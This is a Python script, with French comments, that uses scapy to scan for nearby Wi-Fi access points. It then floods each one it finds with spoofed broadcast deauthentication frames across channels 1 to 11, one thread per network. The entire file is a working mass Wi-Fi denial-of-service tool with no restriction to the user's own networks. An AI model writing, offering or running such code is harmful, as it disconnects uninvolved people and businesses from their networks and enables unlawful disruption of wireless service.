import os
import time
import logging
import threading
from scapy.all import sniff, sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth

# Configuration du logging
logging.basicConfig(level=logging.INFO)

def scan_wifi(interface):
    logging.info("Début du scan des réseaux Wi-Fi...")
    packets = sniff(iface=interface, count=100, timeout=10)  # Correction ici

    networks = []
    for packet in packets:
        if packet.haslayer(Dot11Beacon):
            mac_address = packet[Dot11].addr3
            ssid = None
            for elt in packet[Dot11Elt]:
                if elt.ID == 0:
                    ssid = elt.info.decode("utf-8", errors='ignore')
                    break
            networks.append((mac_address, ssid if ssid else "Hidden"))

    logging.info(f"{len(networks)} réseaux trouvés.")
    return networks

def send_deauth_packets(interface, ap_address):
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address)/Dot11Deauth(reason=7)

    for channel in range(1, 12):
        os.system(f"iwconfig {interface} channel {channel}")
        logging.info(f"Envoi de désauthentification sur le canal {channel} à {ap_address}")
        for _ in range(10):  # Envoi pendant 10 secondes
            sendp(packet, iface=interface, verbose=0)
            time.sleep(1)

if __name__ == "__main__":
    interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi
    networks = scan_wifi(interface)

    threads = []
    for network in networks:
        mac_address, ssid = network
        logging.info(f"Envoi de désauthentification à {mac_address} (SSID: {ssid})")
        thread = threading.Thread(target=send_deauth_packets, args=(interface, mac_address))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
